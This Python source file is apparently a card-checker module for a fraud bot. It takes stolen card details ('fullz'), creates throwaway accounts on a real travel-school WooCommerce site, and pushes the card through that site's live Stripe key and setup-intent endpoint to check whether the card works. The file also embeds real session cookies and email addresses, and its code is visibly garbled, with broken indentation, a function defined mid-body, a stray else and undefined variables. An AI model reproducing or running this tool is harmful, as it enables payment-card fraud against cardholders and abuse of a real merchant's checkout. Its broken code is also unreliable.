import base64
import json
import random
import re
import string
import time
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *
import random
import string
import re
from bs4 import BeautifulSoup
import json
import time
import base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote
from urllib.parse import urlparse, parse_qs

def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None



async def create_braintree_auth(fullz , session):
    try:

        cc, mes, ano, cvv = fullz.split("|")


        session = requests.Session()
        email = generate_random_email()
        headers = {
    'authority': 'www.thetravelinstitute.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
# 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa00077@gmail.com; mailchimp_user_email=rokynoa00077%40gmail.com; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731839322.43.0.0',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html=(response.text)
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        headers = {
    'authority': 'www.thetravelinstitute.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731840062.56.0.0; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; mailchimp.cart.previous_email=rokynoa00077@gmail.com; mailchimp.cart.current_email=rokynoa70@gmail.com; mailchimp_user_previous_email=rokynoa70%40gmail.com; mailchimp_user_email=rokynoa70%40gmail.com',
    'origin': 'https://www.thetravelinstitute.com',
    'referer': 'https://www.thetravelinstitute.com/register/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
        data = [
    ('afurd_field_nonce', f'{nonce}'),
    ('_wp_http_referer', '/register/'),
    ('pre_page', ''),
    ('email', f'{email}'),
    ('password', 'Esahatam2009@'),
    ('wc_order_attribution_source_type', 'typein'),
    ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
    ('wc_order_attribution_utm_campaign', '(none)'),
    ('wc_order_attribution_utm_source', '(direct)'),
    ('wc_order_attribution_utm_medium', '(none)'),
    ('wc_order_attribution_utm_content', '(none)'),
    ('wc_order_attribution_utm_id', '(none)'),
    ('wc_order_attribution_utm_term', '(none)'),
    ('wc_order_attribution_utm_source_platform', '(none)'),
    ('wc_order_attribution_utm_creative_format', '(none)'),
    ('wc_order_attribution_utm_marketing_tactic', '(none)'),
    ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
    ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
    ('wc_order_attribution_session_pages', '8'),
    ('wc_order_attribution_session_count', '1'),
    ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
    ('woocommerce-register-nonce', f'{noncee}'),
    ('_wp_http_referer', '/register/'),
    ('register', 'Register'),
]

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data,timeout=20)
        if response.status_code == 200:
            with open('Creds.txt','a') as f:
                f.write(email+':'+'Esahatam2009@')
                        
        else:
            
            return None
        def generate_random_email(length=8, domain=None):
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)
   
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    
    return f"{username}@{domain}"

        headers = {
    'authority': 'www.thetravelinstitute.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; mailchimp.cart.previous_email=jskdkkf@gmail.com; mailchimp.cart.current_email=rokynoa770@gmail.com; mailchimp_user_previous_email=rokynoa770%40gmail.com; mailchimp_user_email=rokynoa770%40gmail.com; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=rokynoa770%7C1732014706%7CnlixooWRVSegJrJXNcrUsmJaqDN6dbCvUOlUzcgbKUQ%7C121ace480380dc0d60c31096a81844176747e4861cb68812b5fb36a5475be6e4; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731841943.27.0.0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_sid=91fee077-415f-484a-b11c-a224a6d470c6cd06bc',
    'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers,timeout=20)
            html=(response.text)
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)

            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

            data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data,timeout=20)
            res = (response.text)

       else:
                iddd = (response.json()['id'])
            headers = {
    'authority': 'www.thetravelinstitute.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; mailchimp_user_previous_email=rokynoa770%40gmail.com; mailchimp_user_email=rokynoa770%40gmail.com; __stripe_sid=91fee077-415f-484a-b11c-a224a6d470c6cd06bc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2010%3A51%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2010%3A51%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa770@gmail.com; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=rokynoa770%7C1732015295%7Cm1Er1NFmC7q4NvE74vQ7Snt7F9RHgF4qOG0CT9cimNP%7Cd8bc8e35ada5fed2b938c6d5861f6bf604336db01506ddb5de23e0f5bf698a1f; sbjs_session=pgs%3D21%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731842574.60.0.0',
    'origin': 'https://www.thetravelinstitute.com',
    'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

            params = {
    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
}

            data = {
    'action': 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method': iddd,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': nonce,
            }

            
        response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data,timeout=20)
            res = (response.json())


        response=response.text

        # print(response)



        # pattern = re.compile(r'<div class="message-container container alert-color medium-text-center">.*?</div>', re.DOTALL)
        # match = pattern.search(response.text)

        # # Check if a match was found and print it
        # if match:
        #     result = match.group(0)
        #     print(result)
        # else:
        #     print("No match found")

        return response



    except Exception as e:
        return str(e)
